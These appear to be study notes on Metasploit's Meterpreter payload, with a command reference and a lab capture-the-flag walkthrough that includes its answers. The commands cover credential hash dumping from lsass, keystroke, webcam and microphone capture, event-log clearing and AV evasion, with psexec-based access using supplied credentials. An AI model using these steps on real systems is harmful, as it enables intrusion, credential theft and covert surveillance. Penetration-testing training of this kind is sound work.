# Meterpreter — Overview and Common Commands

Meterpreter is Metasploit’s in‑memory payload that acts as an agent on a compromised host.  
It runs in memory (not installed to disk) and provides an interactive command and control interface.

- Meterpreter appears as a process rather than a file, which can help avoid simple file‑based AV detection.  
- Use `getpid` to view the current process ID (for example: Current pid: 1304).  
- Use `ps` to list running processes; Meterpreter may be running under a legitimate process name (e.g., `spoolsv.exe`).

## Meterpreter Variants

`msfvenom --list payloads | grep meterpreter` will show Meterpreter payloads for multiple platforms:

- Android  
- Apple iOS  
- Java  
- Linux  
- macOS (OSX)  
- PHP  
- Python  
- Windows

**Choosing a Meterpreter variant depends on:**

1. Target operating system  
2. Components available on the target (e.g., Python, PHP)  
3. Network constraints (allowed protocols, outbound restrictions, HTTPS only, etc.)

Use the `help` command inside a Meterpreter session to list available commands for that specific variant.

---

## Core Meterpreter Commands

**Session management**
- `background` — Background the current session  
- `exit` — Terminate the Meterpreter session  
- `guid` — Get the session GUID  
- `help` — Display help menu  
- `info` — Display information about a post module  
- `irb` — Open an interactive Ruby shell (if supported)  
- `load` — Load Meterpreter extensions  
- `migrate` — Migrate Meterpreter to another process  
- `run` — Execute a Meterpreter script or post module  
- `sessions` — List or switch sessions

**File system**
- `cd` — Change directory  
- `ls` (or `dir`) — List files in current directory  
- `pwd` — Print working directory  
- `edit` — Edit a file on the target (if supported)  
- `cat` — Display file contents  
- `rm` — Delete a file  
- `search` — Search for files  
- `upload` — Upload a file or directory to the target  
- `download` — Download a file or directory from the target

**Networking**
- `arp` — Display ARP cache  
- `ifconfig` — Show network interfaces  
- `netstat` — Show network connections  
- `portfwd` — Forward a local port to a remote service via the session  
- `route` — View/modify routing table

**System**
- `clearev` — Clear event logs  
- `execute` — Execute a command on the target  
- `getpid` — Show current process ID  
- `getuid` — Show the user Meterpreter is running as  
- `kill` — Terminate a process by PID  
- `pkill` — Terminate processes by name  
- `ps` — List running processes  
- `reboot` — Reboot the remote host  
- `shell` — Drop into a system command shell  
- `shutdown` — Shut down the remote host  
- `sysinfo` — Get OS and system information

**Other useful capabilities**
- `idletime` — Seconds the remote user has been idle  
- `keyscan_dump` — Dump captured keystrokes  
- `keyscan_start` / `keyscan_stop` — Start/stop keystroke capture  
- `screenshare` — View the remote desktop in real time (if supported)  
- `screenshot` — Capture a screenshot of the desktop  
- `record_mic` — Record audio from the microphone for X seconds  
- `webcam_list` / `webcam_snap` / `webcam_stream` — Webcam enumeration, snapshots, and streaming  
- `getsystem` — Attempt privilege escalation to SYSTEM  
- `hashdump` — Dump SAM database hashes

---

## Command Details and Use Cases

- **getuid** — Shows the account Meterpreter is running as (e.g., `NT AUTHORITY\SYSTEM` indicates SYSTEM privileges).  
- **migrate <PID>** — Migrate Meterpreter into another process (e.g., `migrate 772` to move into `lsass.exe`). Migration is useful to stabilize a session or access process‑specific privileges and memory.  
- **hashdump** — Extracts NTLM hashes from the SAM database (requires appropriate privileges).  
- **search -f \*.txt** — Search for text files that may contain sensitive information.  
- **shell** — Launches a system shell; use `Ctrl+Z` to return to the Meterpreter prompt.

---

## Post‑Exploitation Challenge (Example Walkthrough)

**Scenario:** Simulate initial compromise over SMB using provided credentials.

**Credentials**
- Username: `ballen`  
- Password: `Password1`

**High‑level steps (text only):**
1. Start msfconsole and load the psexec exploit: `use exploit/windows/smb/psexec`  
2. View module options: `show options` (note `SMBUser` and `SMBPass`)  
3. Set target and credentials: set `RHOSTS`, `SMBUser`, `SMBPass`  
4. Run the module and obtain a session

**Example results and answers**

- **Q: What is the computer name?**  
  - `sysinfo` → **ACME-TEST**

- **Q: What is the target domain?**  
  - `sysinfo` → **FLASH**

- **Q: What is the name of the share likely created by the user?**  
  - Background the session, run `post/windows/gather/enum_shares` with `SESSION` set → **speedster**

- **Q: What is the NTLM hash of the `jchambers` user?**  
  - Migrate to `lsass.exe` (e.g., `migrate 772`) then `hashdump` → `69596c7aa1e8daee17f8e78870e25a5c`

- **Q: What is the cleartext password for `jchambers`?**  
  - Crack the hash (e.g., using an online cracker) → **Trustno1**

- **Q: Where is `secrets.txt` located? (full path)**  
  - `search -f secrets.txt` → `C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

- **Q: What is the Twitter password in `secrets.txt`?**  
  - `type C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt` → **KDSvbsw3849!**

- **Q: Where is `realsecret.txt` located? (full path)**  
  - `search -f realsecret.txt` → `C:\inetpub\wwwroot\realsecret.txt`

- **Q: What is the real secret?**  
  - `type C:\inetpub\wwwroot\realsecret.txt` → **The Flash is the fastest man alive**

---

## Notes & Best Practices

- Always run `help` in a Meterpreter session to see available commands for that variant.  
- Use `migrate` to move into stable or privileged processes before performing sensitive actions (e.g., `hashdump`, `keyscan`).  
- Be mindful of detection: Meterpreter runs in memory but some AV/EDR solutions detect behavior or network callbacks.  
- Document each step and the session ID used for post‑exploitation modules.  
- When using post modules, ensure you specify the correct `SESSION` value to target the intended connection.

